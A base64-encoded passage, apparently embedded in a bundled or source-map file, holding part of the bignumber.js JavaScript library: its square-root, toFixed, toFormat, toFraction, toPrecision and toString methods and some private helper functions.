bi5pbmRleE9mKCdlJykgKyAxKSArIGU7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICByID0gbmV3IEJpZ051bWJlcihuKTtcclxuICAgICAgfSBlbHNlIHtcclxuICAgICAgICByID0gbmV3IEJpZ051bWJlcihzICsgJycpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICAvLyBDaGVjayBmb3IgemVyby5cclxuICAgICAgLy8gciBjb3VsZCBiZSB6ZXJvIGlmIE1JTl9FWFAgaXMgY2hhbmdlZCBhZnRlciB0aGUgdGhpcyB2YWx1ZSB3YXMgY3JlYXRlZC5cclxuICAgICAgLy8gVGhpcyB3b3VsZCBjYXVzZSBhIGRpdmlzaW9uIGJ5IHplcm8gKHgvdCkgYW5kIGhlbmNlIEluZmluaXR5IGJlbG93LCB3aGljaCB3b3VsZCBjYXVzZVxyXG4gICAgICAvLyBjb2VmZlRvU3RyaW5nIHRvIHRocm93LlxyXG4gICAgICBpZiAoci5jWzBdKSB7XHJcbiAgICAgICAgZSA9IHIuZTtcclxuICAgICAgICBzID0gZSArIGRwO1xyXG4gICAgICAgIGlmIChzIDwgMykgcyA9IDA7XHJcblxyXG4gICAgICAgIC8vIE5ld3Rvbi1SYXBoc29uIGl0ZXJhdGlvbi5cclxuICAgICAgICBmb3IgKDsgOykge1xyXG4gICAgICAgICAgdCA9IHI7XHJcbiAgICAgICAgICByID0gaGFsZi50aW1lcyh0LnBsdXMoZGl2KHgsIHQsIGRwLCAxKSkpO1xyXG5cclxuICAgICAgICAgIGlmIChjb2VmZlRvU3RyaW5nKHQuYyAgKS5zbGljZSgwLCBzKSA9PT0gKG4gPVxyXG4gICAgICAgICAgICAgY29lZmZUb1N0cmluZyhyLmMpKS5zbGljZSgwLCBzKSkge1xyXG5cclxuICAgICAgICAgICAgLy8gVGhlIGV4cG9uZW50IG9mIHIgbWF5IGhlcmUgYmUgb25lIGxlc3MgdGhhbiB0aGUgZmluYWwgcmVzdWx0IGV4cG9uZW50LFxyXG4gICAgICAgICAgICAvLyBlLmcgMC4wMDA5OTk5IChlLTQpIC0tPiAwLjAwMSAoZS0zKSwgc28gYWRqdXN0IHMgc28gdGhlIHJvdW5kaW5nIGRpZ2l0c1xyXG4gICAgICAgICAgICAvLyBhcmUgaW5kZXhlZCBjb3JyZWN0bHkuXHJcbiAgICAgICAgICAgIGlmIChyLmUgPCBlKSAtLXM7XHJcbiAgICAgICAgICAgIG4gPSBuLnNsaWNlKHMgLSAzLCBzICsgMSk7XHJcblxyXG4gICAgICAgICAgICAvLyBUaGUgNHRoIHJvdW5kaW5nIGRpZ2l0IG1heSBiZSBpbiBlcnJvciBieSAtMSBzbyBpZiB0aGUgNCByb3VuZGluZyBkaWdpdHNcclxuICAgICAgICAgICAgLy8gYXJlIDk5OTkgb3IgNDk5OSAoaS5lLiBhcHByb2FjaGluZyBhIHJvdW5kaW5nIGJvdW5kYXJ5KSBjb250aW51ZSB0aGVcclxuICAgICAgICAgICAgLy8gaXRlcmF0aW9uLlxyXG4gICAgICAgICAgICBpZiAobiA9PSAnOTk5OScgfHwgIXJlcCAmJiBuID09ICc0OTk5Jykge1xyXG5cclxuICAgICAgICAgICAgICAvLyBPbiB0aGUgZmlyc3QgaXRlcmF0aW9uIG9ubHksIGNoZWNrIHRvIHNlZSBpZiByb3VuZGluZyB1cCBnaXZlcyB0aGVcclxuICAgICAgICAgICAgICAvLyBleGFjdCByZXN1bHQgYXMgdGhlIG5pbmVzIG1heSBpbmZpbml0ZWx5IHJlcGVhdC5cclxuICAgICAgICAgICAgICBpZiAoIXJlcCkge1xyXG4gICAgICAgICAgICAgICAgcm91bmQodCwgdC5lICsgREVDSU1BTF9QTEFDRVMgKyAyLCAwKTtcclxuXHJcbiAgICAgICAgICAgICAgICBpZiAodC50aW1lcyh0KS5lcSh4KSkge1xyXG4gICAgICAgICAgICAgICAgICByID0gdDtcclxuICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICBkcCArPSA0O1xyXG4gICAgICAgICAgICAgIHMgKz0gNDtcclxuICAgICAgICAgICAgICByZXAgPSAxO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG5cclxuICAgICAgICAgICAgICAvLyBJZiByb3VuZGluZyBkaWdpdHMgYXJlIG51bGwsIDB7MCw0fSBvciA1MHswLDN9LCBjaGVjayBmb3IgZXhhY3RcclxuICAgICAgICAgICAgICAvLyByZXN1bHQuIElmIG5vdCwgdGhlbiB0aGVyZSBhcmUgZnVydGhlciBkaWdpdHMgYW5kIG0gd2lsbCBiZSB0cnV0aHkuXHJcbiAgICAgICAgICAgICAgaWYgKCErbiB8fCAhK24uc2xpY2UoMSkgJiYgbi5jaGFyQXQoMCkgPT0gJzUnKSB7XHJcblxyXG4gICAgICAgICAgICAgICAgLy8gVHJ1bmNhdGUgdG8gdGhlIGZpcnN0IHJvdW5kaW5nIGRpZ2l0LlxyXG4gICAgICAgICAgICAgICAgcm91bmQociwgci5lICsgREVDSU1BTF9QTEFDRVMgKyAyLCAxKTtcclxuICAgICAgICAgICAgICAgIG0gPSAhci50aW1lcyhyKS5lcSh4KTtcclxuICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgICB9XHJcblxyXG4gICAgICByZXR1cm4gcm91bmQociwgci5lICsgREVDSU1BTF9QTEFDRVMgKyAxLCBST1VORElOR19NT0RFLCBtKTtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYSBzdHJpbmcgcmVwcmVzZW50aW5nIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpbiBleHBvbmVudGlhbCBub3RhdGlvbiBhbmRcclxuICAgICAqIHJvdW5kZWQgdXNpbmcgUk9VTkRJTkdfTU9ERSB0byBkcCBmaXhlZCBkZWNpbWFsIHBsYWNlcy5cclxuICAgICAqXHJcbiAgICAgKiBbZHBdIHtudW1iZXJ9IERlY2ltYWwgcGxhY2VzLiBJbnRlZ2VyLCAwIHRvIE1BWCBpbmNsdXNpdmUuXHJcbiAgICAgKiBbcm1dIHtudW1iZXJ9IFJvdW5kaW5nIG1vZGUuIEludGVnZXIsIDAgdG8gOCBpbmNsdXNpdmUuXHJcbiAgICAgKlxyXG4gICAgICogJ1tCaWdOdW1iZXIgRXJyb3JdIEFyZ3VtZW50IHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHtkcHxybX0nXHJcbiAgICAgKi9cclxuICAgIFAudG9FeHBvbmVudGlhbCA9IGZ1bmN0aW9uIChkcCwgcm0pIHtcclxuICAgICAgaWYgKGRwICE9IG51bGwpIHtcclxuICAgICAgICBpbnRDaGVjayhkcCwgMCwgTUFYKTtcclxuICAgICAgICBkcCsrO1xyXG4gICAgICB9XHJcbiAgICAgIHJldHVybiBmb3JtYXQodGhpcywgZHAsIHJtLCAxKTtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYSBzdHJpbmcgcmVwcmVzZW50aW5nIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpbiBmaXhlZC1wb2ludCBub3RhdGlvbiByb3VuZGluZ1xyXG4gICAgICogdG8gZHAgZml4ZWQgZGVjaW1hbCBwbGFjZXMgdXNpbmcgcm91bmRpbmcgbW9kZSBybSwgb3IgUk9VTkRJTkdfTU9ERSBpZiBybSBpcyBvbWl0dGVkLlxyXG4gICAgICpcclxuICAgICAqIE5vdGU6IGFzIHdpdGggSmF2YVNjcmlwdCdzIG51bWJlciB0eXBlLCAoLTApLnRvRml4ZWQoMCkgaXMgJzAnLFxyXG4gICAgICogYnV0IGUuZy4gKC0wLjAwMDAxKS50b0ZpeGVkKDApIGlzICctMCcuXHJcbiAgICAgKlxyXG4gICAgICogW2RwXSB7bnVtYmVyfSBEZWNpbWFsIHBsYWNlcy4gSW50ZWdlciwgMCB0byBNQVggaW5jbHVzaXZlLlxyXG4gICAgICogW3JtXSB7bnVtYmVyfSBSb3VuZGluZyBtb2RlLiBJbnRlZ2VyLCAwIHRvIDggaW5jbHVzaXZlLlxyXG4gICAgICpcclxuICAgICAqICdbQmlnTnVtYmVyIEVycm9yXSBBcmd1bWVudCB7bm90IGEgcHJpbWl0aXZlIG51bWJlcnxub3QgYW4gaW50ZWdlcnxvdXQgb2YgcmFuZ2V9OiB7ZHB8cm19J1xyXG4gICAgICovXHJcbiAgICBQLnRvRml4ZWQgPSBmdW5jdGlvbiAoZHAsIHJtKSB7XHJcbiAgICAgIGlmIChkcCAhPSBudWxsKSB7XHJcbiAgICAgICAgaW50Q2hlY2soZHAsIDAsIE1BWCk7XHJcbiAgICAgICAgZHAgPSBkcCArIHRoaXMuZSArIDE7XHJcbiAgICAgIH1cclxuICAgICAgcmV0dXJuIGZvcm1hdCh0aGlzLCBkcCwgcm0pO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGluIGZpeGVkLXBvaW50IG5vdGF0aW9uIHJvdW5kZWRcclxuICAgICAqIHVzaW5nIHJtIG9yIFJPVU5ESU5HX01PREUgdG8gZHAgZGVjaW1hbCBwbGFjZXMsIGFuZCBmb3JtYXR0ZWQgYWNjb3JkaW5nIHRvIHRoZSBwcm9wZXJ0aWVzXHJcbiAgICAgKiBvZiB0aGUgRk9STUFUIG9iamVjdCAoc2VlIEJpZ051bWJlci5zZXQpLlxyXG4gICAgICpcclxuICAgICAqIEZPUk1BVCA9IHtcclxuICAgICAqICAgICAgZGVjaW1hbFNlcGFyYXRvciA6ICcuJyxcclxuICAgICAqICAgICAgZ3JvdXBTZXBhcmF0b3IgOiAnLCcsXHJcbiAgICAgKiAgICAgIGdyb3VwU2l6ZSA6IDMsXHJcbiAgICAgKiAgICAgIHNlY29uZGFyeUdyb3VwU2l6ZSA6IDAsXHJcbiAgICAgKiAgICAgIGZyYWN0aW9uR3JvdXBTZXBhcmF0b3IgOiAnXFx4QTAnLCAgICAvLyBub24tYnJlYWtpbmcgc3BhY2VcclxuICAgICAqICAgICAgZnJhY3Rpb25Hcm91cFNpemUgOiAwXHJcbiAgICAgKiB9O1xyXG4gICAgICpcclxuICAgICAqIFtkcF0ge251bWJlcn0gRGVjaW1hbCBwbGFjZXMuIEludGVnZXIsIDAgdG8gTUFYIGluY2x1c2l2ZS5cclxuICAgICAqIFtybV0ge251bWJlcn0gUm91bmRpbmcgbW9kZS4gSW50ZWdlciwgMCB0byA4IGluY2x1c2l2ZS5cclxuICAgICAqXHJcbiAgICAgKiAnW0JpZ051bWJlciBFcnJvcl0gQXJndW1lbnQge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge2RwfHJtfSdcclxuICAgICAqL1xyXG4gICAgUC50b0Zvcm1hdCA9IGZ1bmN0aW9uIChkcCwgcm0pIHtcclxuICAgICAgdmFyIHN0ciA9IHRoaXMudG9GaXhlZChkcCwgcm0pO1xyXG5cclxuICAgICAgaWYgKHRoaXMuYykge1xyXG4gICAgICAgIHZhciBpLFxyXG4gICAgICAgICAgYXJyID0gc3RyLnNwbGl0KCcuJyksXHJcbiAgICAgICAgICBnMSA9ICtGT1JNQVQuZ3JvdXBTaXplLFxyXG4gICAgICAgICAgZzIgPSArRk9STUFULnNlY29uZGFyeUdyb3VwU2l6ZSxcclxuICAgICAgICAgIGdyb3VwU2VwYXJhdG9yID0gRk9STUFULmdyb3VwU2VwYXJhdG9yLFxyXG4gICAgICAgICAgaW50UGFydCA9IGFyclswXSxcclxuICAgICAgICAgIGZyYWN0aW9uUGFydCA9IGFyclsxXSxcclxuICAgICAgICAgIGlzTmVnID0gdGhpcy5zIDwgMCxcclxuICAgICAgICAgIGludERpZ2l0cyA9IGlzTmVnID8gaW50UGFydC5zbGljZSgxKSA6IGludFBhcnQsXHJcbiAgICAgICAgICBsZW4gPSBpbnREaWdpdHMubGVuZ3RoO1xyXG5cclxuICAgICAgICBpZiAoZzIpIGkgPSBnMSwgZzEgPSBnMiwgZzIgPSBpLCBsZW4gLT0gaTtcclxuXHJcbiAgICAgICAgaWYgKGcxID4gMCAmJiBsZW4gPiAwKSB7XHJcbiAgICAgICAgICBpID0gbGVuICUgZzEgfHwgZzE7XHJcbiAgICAgICAgICBpbnRQYXJ0ID0gaW50RGlnaXRzLnN1YnN0cigwLCBpKTtcclxuXHJcbiAgICAgICAgICBmb3IgKDsgaSA8IGxlbjsgaSArPSBnMSkge1xyXG4gICAgICAgICAgICBpbnRQYXJ0ICs9IGdyb3VwU2VwYXJhdG9yICsgaW50RGlnaXRzLnN1YnN0cihpLCBnMSk7XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgaWYgKGcyID4gMCkgaW50UGFydCArPSBncm91cFNlcGFyYXRvciArIGludERpZ2l0cy5zbGljZShpKTtcclxuICAgICAgICAgIGlmIChpc05lZykgaW50UGFydCA9ICctJyArIGludFBhcnQ7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdHIgPSBmcmFjdGlvblBhcnRcclxuICAgICAgICAgPyBpbnRQYXJ0ICsgRk9STUFULmRlY2ltYWxTZXBhcmF0b3IgKyAoKGcyID0gK0ZPUk1BVC5mcmFjdGlvbkdyb3VwU2l6ZSlcclxuICAgICAgICAgID8gZnJhY3Rpb25QYXJ0LnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxcXGR7JyArIGcyICsgJ31cXFxcQicsICdnJyksXHJcbiAgICAgICAgICAgJyQmJyArIEZPUk1BVC5mcmFjdGlvbkdyb3VwU2VwYXJhdG9yKVxyXG4gICAgICAgICAgOiBmcmFjdGlvblBhcnQpXHJcbiAgICAgICAgIDogaW50UGFydDtcclxuICAgICAgfVxyXG5cclxuICAgICAgcmV0dXJuIHN0cjtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYSBzdHJpbmcgYXJyYXkgcmVwcmVzZW50aW5nIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBhcyBhIHNpbXBsZSBmcmFjdGlvbiB3aXRoXHJcbiAgICAgKiBhbiBpbnRlZ2VyIG51bWVyYXRvciBhbmQgYW4gaW50ZWdlciBkZW5vbWluYXRvci4gVGhlIGRlbm9taW5hdG9yIHdpbGwgYmUgYSBwb3NpdGl2ZVxyXG4gICAgICogbm9uLXplcm8gdmFsdWUgbGVzcyB0aGFuIG9yIGVxdWFsIHRvIHRoZSBzcGVjaWZpZWQgbWF4aW11bSBkZW5vbWluYXRvci4gSWYgYSBtYXhpbXVtXHJcbiAgICAgKiBkZW5vbWluYXRvciBpcyBub3Qgc3BlY2lmaWVkLCB0aGUgZGVub21pbmF0b3Igd2lsbCBiZSB0aGUgbG93ZXN0IHZhbHVlIG5lY2Vzc2FyeSB0b1xyXG4gICAgICogcmVwcmVzZW50IHRoZSBudW1iZXIgZXhhY3RseS5cclxuICAgICAqXHJcbiAgICAgKiBbbWRdIHtudW1iZXJ8c3RyaW5nfEJpZ051bWJlcn0gSW50ZWdlciA+PSAxLCBvciBJbmZpbml0eS4gVGhlIG1heGltdW0gZGVub21pbmF0b3IuXHJcbiAgICAgKlxyXG4gICAgICogJ1tCaWdOdW1iZXIgRXJyb3JdIEFyZ3VtZW50IHtub3QgYW4gaW50ZWdlcnxvdXQgb2YgcmFuZ2V9IDoge21kfSdcclxuICAgICAqL1xyXG4gICAgUC50b0ZyYWN0aW9uID0gZnVuY3Rpb24gKG1kKSB7XHJcbiAgICAgIHZhciBhcnIsIGQsIGQwLCBkMSwgZDIsIGUsIGV4cCwgbiwgbjAsIG4xLCBxLCBzLFxyXG4gICAgICAgIHggPSB0aGlzLFxyXG4gICAgICAgIHhjID0geC5jO1xyXG5cclxuICAgICAgaWYgKG1kICE9IG51bGwpIHtcclxuICAgICAgICBuID0gbmV3IEJpZ051bWJlcihtZCk7XHJcblxyXG4gICAgICAgIC8vIFRocm93IGlmIG1kIGlzIGxlc3MgdGhhbiBvbmUgb3IgaXMgbm90IGFuIGludGVnZXIsIHVubGVzcyBpdCBpcyBJbmZpbml0eS5cclxuICAgICAgICBpZiAoIW4uaXNJbnRlZ2VyKCkgJiYgKG4uYyB8fCBuLnMgIT09IDEpIHx8IG4ubHQoT05FKSkge1xyXG4gICAgICAgICAgdGhyb3cgRXJyb3JcclxuICAgICAgICAgICAgKGJpZ251bWJlckVycm9yICsgJ0FyZ3VtZW50ICcgK1xyXG4gICAgICAgICAgICAgIChuLmlzSW50ZWdlcigpID8gJ291dCBvZiByYW5nZTogJyA6ICdub3QgYW4gaW50ZWdlcjogJykgKyBtZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICB9XHJcblxyXG4gICAgICBpZiAoIXhjKSByZXR1cm4geC50b1N0cmluZygpO1xyXG5cclxuICAgICAgZCA9IG5ldyBCaWdOdW1iZXIoT05FKTtcclxuICAgICAgbjEgPSBkMCA9IG5ldyBCaWdOdW1iZXIoT05FKTtcclxuICAgICAgZDEgPSBuMCA9IG5ldyBCaWdOdW1iZXIoT05FKTtcclxuICAgICAgcyA9IGNvZWZmVG9TdHJpbmcoeGMpO1xyXG5cclxuICAgICAgLy8gRGV0ZXJtaW5lIGluaXRpYWwgZGVub21pbmF0b3IuXHJcbiAgICAgIC8vIGQgaXMgYSBwb3dlciBvZiAxMCBhbmQgdGhlIG1pbmltdW0gbWF4IGRlbm9taW5hdG9yIHRoYXQgc3BlY2lmaWVzIHRoZSB2YWx1ZSBleGFjdGx5LlxyXG4gICAgICBlID0gZC5lID0gcy5sZW5ndGggLSB4LmUgLSAxO1xyXG4gICAgICBkLmNbMF0gPSBQT1dTX1RFTlsoZXhwID0gZSAlIExPR19CQVNFKSA8IDAgPyBMT0dfQkFTRSArIGV4cCA6IGV4cF07XHJcbiAgICAgIG1kID0gIW1kIHx8IG4uY29tcGFyZWRUbyhkKSA+IDAgPyAoZSA+IDAgPyBkIDogbjEpIDogbjtcclxuXHJcbiAgICAgIGV4cCA9IE1BWF9FWFA7XHJcbiAgICAgIE1BWF9FWFAgPSAxIC8gMDtcclxuICAgICAgbiA9IG5ldyBCaWdOdW1iZXIocyk7XHJcblxyXG4gICAgICAvLyBuMCA9IGQxID0gMFxyXG4gICAgICBuMC5jWzBdID0gMDtcclxuXHJcbiAgICAgIGZvciAoOyA7KSAge1xyXG4gICAgICAgIHEgPSBkaXYobiwgZCwgMCwgMSk7XHJcbiAgICAgICAgZDIgPSBkMC5wbHVzKHEudGltZXMoZDEpKTtcclxuICAgICAgICBpZiAoZDIuY29tcGFyZWRUbyhtZCkgPT0gMSkgYnJlYWs7XHJcbiAgICAgICAgZDAgPSBkMTtcclxuICAgICAgICBkMSA9IGQyO1xyXG4gICAgICAgIG4xID0gbjAucGx1cyhxLnRpbWVzKGQyID0gbjEpKTtcclxuICAgICAgICBuMCA9IGQyO1xyXG4gICAgICAgIGQgPSBuLm1pbnVzKHEudGltZXMoZDIgPSBkKSk7XHJcbiAgICAgICAgbiA9IGQyO1xyXG4gICAgICB9XHJcblxyXG4gICAgICBkMiA9IGRpdihtZC5taW51cyhkMCksIGQxLCAwLCAxKTtcclxuICAgICAgbjAgPSBuMC5wbHVzKGQyLnRpbWVzKG4xKSk7XHJcbiAgICAgIGQwID0gZDAucGx1cyhkMi50aW1lcyhkMSkpO1xyXG4gICAgICBuMC5zID0gbjEucyA9IHgucztcclxuICAgICAgZSAqPSAyO1xyXG5cclxuICAgICAgLy8gRGV0ZXJtaW5lIHdoaWNoIGZyYWN0aW9uIGlzIGNsb3NlciB0byB4LCBuMC9kMCBvciBuMS9kMVxyXG4gICAgICBhcnIgPSBkaXYobjEsIGQxLCBlLCBST1VORElOR19NT0RFKS5taW51cyh4KS5hYnMoKS5jb21wYXJlZFRvKFxyXG4gICAgICAgICBkaXYobjAsIGQwLCBlLCBST1VORElOR19NT0RFKS5taW51cyh4KS5hYnMoKSkgPCAxXHJcbiAgICAgICAgICA/IFtuMS50b1N0cmluZygpLCBkMS50b1N0cmluZygpXVxyXG4gICAgICAgICAgOiBbbjAudG9TdHJpbmcoKSwgZDAudG9TdHJpbmcoKV07XHJcblxyXG4gICAgICBNQVhfRVhQID0gZXhwO1xyXG4gICAgICByZXR1cm4gYXJyO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgY29udmVydGVkIHRvIGEgbnVtYmVyIHByaW1pdGl2ZS5cclxuICAgICAqL1xyXG4gICAgUC50b051bWJlciA9IGZ1bmN0aW9uICgpIHtcclxuICAgICAgcmV0dXJuICt0aGlzO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIHJvdW5kZWQgdG8gc2Qgc2lnbmlmaWNhbnQgZGlnaXRzXHJcbiAgICAgKiB1c2luZyByb3VuZGluZyBtb2RlIHJtIG9yIFJPVU5ESU5HX01PREUuIElmIHNkIGlzIGxlc3MgdGhhbiB0aGUgbnVtYmVyIG9mIGRpZ2l0c1xyXG4gICAgICogbmVjZXNzYXJ5IHRvIHJlcHJlc2VudCB0aGUgaW50ZWdlciBwYXJ0IG9mIHRoZSB2YWx1ZSBpbiBmaXhlZC1wb2ludCBub3RhdGlvbiwgdGhlbiB1c2VcclxuICAgICAqIGV4cG9uZW50aWFsIG5vdGF0aW9uLlxyXG4gICAgICpcclxuICAgICAqIFtzZF0ge251bWJlcn0gU2lnbmlmaWNhbnQgZGlnaXRzLiBJbnRlZ2VyLCAxIHRvIE1BWCBpbmNsdXNpdmUuXHJcbiAgICAgKiBbcm1dIHtudW1iZXJ9IFJvdW5kaW5nIG1vZGUuIEludGVnZXIsIDAgdG8gOCBpbmNsdXNpdmUuXHJcbiAgICAgKlxyXG4gICAgICogJ1tCaWdOdW1iZXIgRXJyb3JdIEFyZ3VtZW50IHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHtzZHxybX0nXHJcbiAgICAgKi9cclxuICAgIFAudG9QcmVjaXNpb24gPSBmdW5jdGlvbiAoc2QsIHJtKSB7XHJcbiAgICAgIGlmIChzZCAhPSBudWxsKSBpbnRDaGVjayhzZCwgMSwgTUFYKTtcclxuICAgICAgcmV0dXJuIGZvcm1hdCh0aGlzLCBzZCwgcm0sIDIpO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGluIGJhc2UgYiwgb3IgYmFzZSAxMCBpZiBiIGlzXHJcbiAgICAgKiBvbWl0dGVkLiBJZiBhIGJhc2UgaXMgc3BlY2lmaWVkLCBpbmNsdWRpbmcgYmFzZSAxMCwgcm91bmQgYWNjb3JkaW5nIHRvIERFQ0lNQUxfUExBQ0VTIGFuZFxyXG4gICAgICogUk9VTkRJTkdfTU9ERS4gSWYgYSBiYXNlIGlzIG5vdCBzcGVjaWZpZWQsIGFuZCB0aGlzIEJpZ051bWJlciBoYXMgYSBwb3NpdGl2ZSBleHBvbmVudFxyXG4gICAgICogdGhhdCBpcyBlcXVhbCB0byBvciBncmVhdGVyIHRoYW4gVE9fRVhQX1BPUywgb3IgYSBuZWdhdGl2ZSBleHBvbmVudCBlcXVhbCB0byBvciBsZXNzIHRoYW5cclxuICAgICAqIFRPX0VYUF9ORUcsIHJldHVybiBleHBvbmVudGlhbCBub3RhdGlvbi5cclxuICAgICAqXHJcbiAgICAgKiBbYl0ge251bWJlcn0gSW50ZWdlciwgMiB0byBBTFBIQUJFVC5sZW5ndGggaW5jbHVzaXZlLlxyXG4gICAgICpcclxuICAgICAqICdbQmlnTnVtYmVyIEVycm9yXSBCYXNlIHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHtifSdcclxuICAgICAqL1xyXG4gICAgUC50b1N0cmluZyA9IGZ1bmN0aW9uIChiKSB7XHJcbiAgICAgIHZhciBzdHIsXHJcbiAgICAgICAgbiA9IHRoaXMsXHJcbiAgICAgICAgcyA9IG4ucyxcclxuICAgICAgICBlID0gbi5lO1xyXG5cclxuICAgICAgLy8gSW5maW5pdHkgb3IgTmFOP1xyXG4gICAgICBpZiAoZSA9PT0gbnVsbCkge1xyXG5cclxuICAgICAgICBpZiAocykge1xyXG4gICAgICAgICAgc3RyID0gJ0luZmluaXR5JztcclxuICAgICAgICAgIGlmIChzIDwgMCkgc3RyID0gJy0nICsgc3RyO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICBzdHIgPSAnTmFOJztcclxuICAgICAgICB9XHJcbiAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgc3RyID0gY29lZmZUb1N0cmluZyhuLmMpO1xyXG5cclxuICAgICAgICBpZiAoYiA9PSBudWxsKSB7XHJcbiAgICAgICAgICBzdHIgPSBlIDw9IFRPX0VYUF9ORUcgfHwgZSA+PSBUT19FWFBfUE9TXHJcbiAgICAgICAgICAgPyB0b0V4cG9uZW50aWFsKHN0ciwgZSlcclxuICAgICAgICAgICA6IHRvRml4ZWRQb2ludChzdHIsIGUsICcwJyk7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgIGludENoZWNrKGIsIDIsIEFMUEhBQkVULmxlbmd0aCwgJ0Jhc2UnKTtcclxuICAgICAgICAgIHN0ciA9IGNvbnZlcnRCYXNlKHRvRml4ZWRQb2ludChzdHIsIGUsICcwJyksIDEwLCBiLCBzLCB0cnVlKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChzIDwgMCAmJiBuLmNbMF0pIHN0ciA9ICctJyArIHN0cjtcclxuICAgICAgfVxyXG5cclxuICAgICAgcmV0dXJuIHN0cjtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYXMgdG9TdHJpbmcsIGJ1dCBkbyBub3QgYWNjZXB0IGEgYmFzZSBhcmd1bWVudCwgYW5kIGluY2x1ZGUgdGhlIG1pbnVzIHNpZ24gZm9yXHJcbiAgICAgKiBuZWdhdGl2ZSB6ZXJvLlxyXG4gICAgICovXHJcbiAgICBQLnZhbHVlT2YgPSBQLnRvSlNPTiA9IGZ1bmN0aW9uICgpIHtcclxuICAgICAgdmFyIHN0cixcclxuICAgICAgICBuID0gdGhpcyxcclxuICAgICAgICBlID0gbi5lO1xyXG5cclxuICAgICAgaWYgKGUgPT09IG51bGwpIHJldHVybiBuLnRvU3RyaW5nKCk7XHJcblxyXG4gICAgICBzdHIgPSBjb2VmZlRvU3RyaW5nKG4uYyk7XHJcblxyXG4gICAgICBzdHIgPSBlIDw9IFRPX0VYUF9ORUcgfHwgZSA+PSBUT19FWFBfUE9TXHJcbiAgICAgICAgPyB0b0V4cG9uZW50aWFsKHN0ciwgZSlcclxuICAgICAgICA6IHRvRml4ZWRQb2ludChzdHIsIGUsICcwJyk7XHJcblxyXG4gICAgICByZXR1cm4gbi5zIDwgMCA/ICctJyArIHN0ciA6IHN0cjtcclxuICAgIH07XHJcblxyXG5cclxuICAgIFAuX2lzQmlnTnVtYmVyID0gdHJ1ZTtcclxuXHJcbiAgICBpZiAoY29uZmlnT2JqZWN0ICE9IG51bGwpIEJpZ051bWJlci5zZXQoY29uZmlnT2JqZWN0KTtcclxuXHJcbiAgICByZXR1cm4gQmlnTnVtYmVyO1xyXG4gIH1cclxuXHJcblxyXG4gIC8vIFBSSVZBVEUgSEVMUEVSIEZVTkNUSU9OU1xyXG5cclxuXHJcbiAgZnVuY3Rpb24gYml0Rmxvb3Iobikge1xyXG4gICAgdmFyIGkgPSBuIHwgMDtcclxuICAgIHJldHVybiBuID4gMCB8fCBuID09PSBpID8gaSA6IGkgLSAxO1xyXG4gIH1cclxuXHJcblxyXG4gIC8vIFJldHVybiBhIGNvZWZmaWNpZW50IGFycmF5IGFzIGEgc3RyaW5nIG9mIGJhc2UgMTAgZGlnaXRzLlxyXG4gIGZ1bmN0aW9uIGNvZWZmVG9TdHJpbmcoYSkge1xyXG4gICAgdmFyIHMsIHosXHJcbiAgICAgIGkgPSAxLFxyXG4gICAgICBqID0gYS5sZW5ndGgsXHJcbiAgICAgIHIgPSBhWzBdICsgJyc7XHJcblxyXG4gICAgZm9yICg7IGkgPCBqOykge1xyXG4gICAgICBzID0gYVtpKytdICsgJyc7XHJcbiAgICAgIHogPSBMT0dfQkFTRSAtIHMubGVuZ3RoO1xyXG4gICAgICBmb3IgKDsgei0tOyBzID0gJzAnICsgcyk7XHJcbiAgICAgIHIgKz0gcztcclxuICAgIH1cclxuXHJcbiAgICAvLyBEZXRlcm1pbmUgdHJhaWxpbmcgemVyb3MuXHJcbiAgICBmb3IgKGogPSByLmxlbmd0aDsgci5jaGFyQ29kZUF0KC0taikgPT09IDQ4Oyk7XHJcbiAgICByZXR1cm4gci5zbGljZSgwLCBqICsgMSB8